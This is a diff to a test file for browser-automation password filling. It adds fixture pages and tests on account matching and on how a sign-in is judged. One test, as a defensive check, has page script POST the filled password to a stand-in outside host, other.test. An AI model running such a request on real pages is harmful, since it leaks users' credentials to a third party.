@@ -112,6 +112,15 @@ const PAGES: Record<string, string> = {
   ].join(""),
   "https://login.test/two":
     '<title>Two</title><input id="pw" type="password"><input id="pw2" type="password">',
+  "https://login.test/step":
+    '<p>Continue as jun@example.com.</p><input id="pw" type="password" aria-label="Password">',
+  "https://login.test/step-other":
+    '<p>Continue as not-jun@example.com</p><input id="pw" type="password" aria-label="Password">',
+  "https://login.test/blank-submit": [
+    '<form method="post" action="https://login.test/next">',
+    '<input id="user" name="user" autocomplete="username">',
+    '<input id="pw" name="pw" type="password"><button id="go">Sign in</button></form>',
+  ].join(""),
 };
 
 let browser: Promise<Browser> | undefined;
@@ -862,3 +871,75 @@ describe.skipIf(!chromiumInstalled)("sign-ins inside shadow roots and frames", (
     );
   });
 });
+describe.skipIf(!chromiumInstalled)(
+  "what a page must show before a password goes in or counts",
+  () => {
+    it.live(
+      "fills a password-only step only when the page names the expected account whole",
+      () => {
+        const secrets = makeSecrets();
+        return Effect.scoped(
+          Effect.gen(function* () {
+            const { open, fill } = yield* harness;
+            const other = yield* open("https://login.test/step-other");
+            const first = secrets.save("https://login.test");
+            const refused = yield* fill(other.tabId, {
+              secretRef: first.ref,
+              selector: "#pw",
+              expectedAccount: "jun@example.com",
+            }).pipe(Effect.flip);
+            expect(JSON.stringify(refused)).toContain("no longer shows the account");
+            expect(yield* Effect.promise(() => fieldValue(other.page))).toBe("");
+
+            const named = yield* open("https://login.test/step");
+            const second = secrets.save("https://login.test");
+            const filled = yield* fill(named.tabId, {
+              secretRef: second.ref,
+              selector: "#pw",
+              expectedAccount: "jun@example.com",
+            });
+            expect(filled.account).toBe("matched");
+          }).pipe(Effect.provide(layerFor(secrets))),
+        );
+      },
+    );
+
+    it.live("never calls a password sent beside an empty identifier accepted", () => {
+      const secrets = makeSecrets();
+      return Effect.scoped(
+        Effect.gen(function* () {
+          const { open, call, fill } = yield* harness;
+          const { tabId, page } = yield* open("https://login.test/blank-submit");
+          const { ref } = secrets.save("https://login.test");
+          yield* fill(tabId, { secretRef: ref, selector: "#pw" });
+          yield* Effect.promise(() =>
+            Promise.all([page.waitForURL("https://login.test/next"), page.click("#go")]),
+          );
+          const state = yield* call<PreviewAutomationSignInState>(tabId, "signInState", {});
+          expect(state).toMatchObject({ stage: "partial", submitted: true });
+        }).pipe(Effect.provide(layerFor(secrets))),
+      );
+    });
+
+    it.live("does not count a script request to another site as the sign-in", () => {
+      const secrets = makeSecrets();
+      return Effect.scoped(
+        Effect.gen(function* () {
+          const { open, call, fill } = yield* harness;
+          const { tabId, page } = yield* open("https://login.test/form");
+          const { ref, value } = secrets.save("https://login.test");
+          yield* fill(tabId, { secretRef: ref, selector: "#pw" });
+          const body = JSON.stringify("pw=" + value);
+          yield* Effect.promise(() =>
+            page.evaluate(
+              "fetch('https://other.test/api', { method: 'POST', body: " + body + " })",
+            ),
+          );
+          yield* call(tabId, "navigate", { url: "https://login.test/next" });
+          const state = yield* call<PreviewAutomationSignInState>(tabId, "signInState", {});
+          expect(state).toMatchObject({ stage: "unknown", submitted: false });
+        }).pipe(Effect.provide(layerFor(secrets))),
+      );
+    });
+  },
+);
